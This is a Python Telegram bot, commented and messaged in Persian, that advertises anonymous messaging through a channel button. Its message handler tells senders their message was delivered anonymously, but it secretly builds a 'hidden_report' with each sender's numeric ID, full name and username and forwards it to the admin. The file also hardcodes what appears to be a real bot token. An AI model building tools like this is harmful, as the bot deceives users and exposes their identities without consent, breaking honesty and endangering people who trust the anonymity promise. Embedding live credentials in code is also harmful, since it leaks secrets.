from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
import logging

# فعال‌سازی لاگ برای دیباگ راحت‌تر
logging.basicConfig(level=logging.INFO)

TOKEN = "7669113616:AAH6qqabVjqVu4X44GFrs68AjN3CaEFPoMg"
CHANNEL_ID = "@im_sadegh"  # یا عددی اگر کانال خصوصی است
ADMIN_CHAT_ID = 5280481527


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "هر پیامی بدین بهم ارسال میشه"
    )


async def setup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    bot_info = await context.bot.get_me()
    bot_username = bot_info.username

    # دکمه شیشه‌ای با لینک به ربات
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("پیامتونو ناشنانس بهم بدین",
                              url=f"https://t.me/{bot_username}")]
    ])

    try:
        await context.bot.send_message(
            chat_id=CHANNEL_ID,
            text="برای ارسال پیام ناشناس رو دکمه زیر کلیک کنین:",
            reply_markup=keyboard
        )
        await update.message.reply_text("✅ پیام با موفقیت در کانال ارسال شد.")
    except Exception as e:
        await update.message.reply_text(f"❌ ارسال پیام به کانال با خطا مواجه شد: {e}")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.message.chat.type == "private":
        user = update.message.from_user
        message = update.message.text

        hidden_report = (
            f"📥 پیام جدید ناشناس:\n"
            f"🆔 آیدی عددی: {user.id}\n"
            f"👤 نام کامل: {user.full_name}\n"
            f"🔗 نام کاربری: @{user.username or 'ندارد'}\n"
            f"📨 متن پیام:\n{message}"
        )

        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=hidden_report)
        await update.message.reply_text("✅ پیامتون بصورت ناشناس بهم ارسال شد \n")


def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setup", setup))
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND, handle_message))

    app.run_polling()


if __name__ == "__main__":
    main()
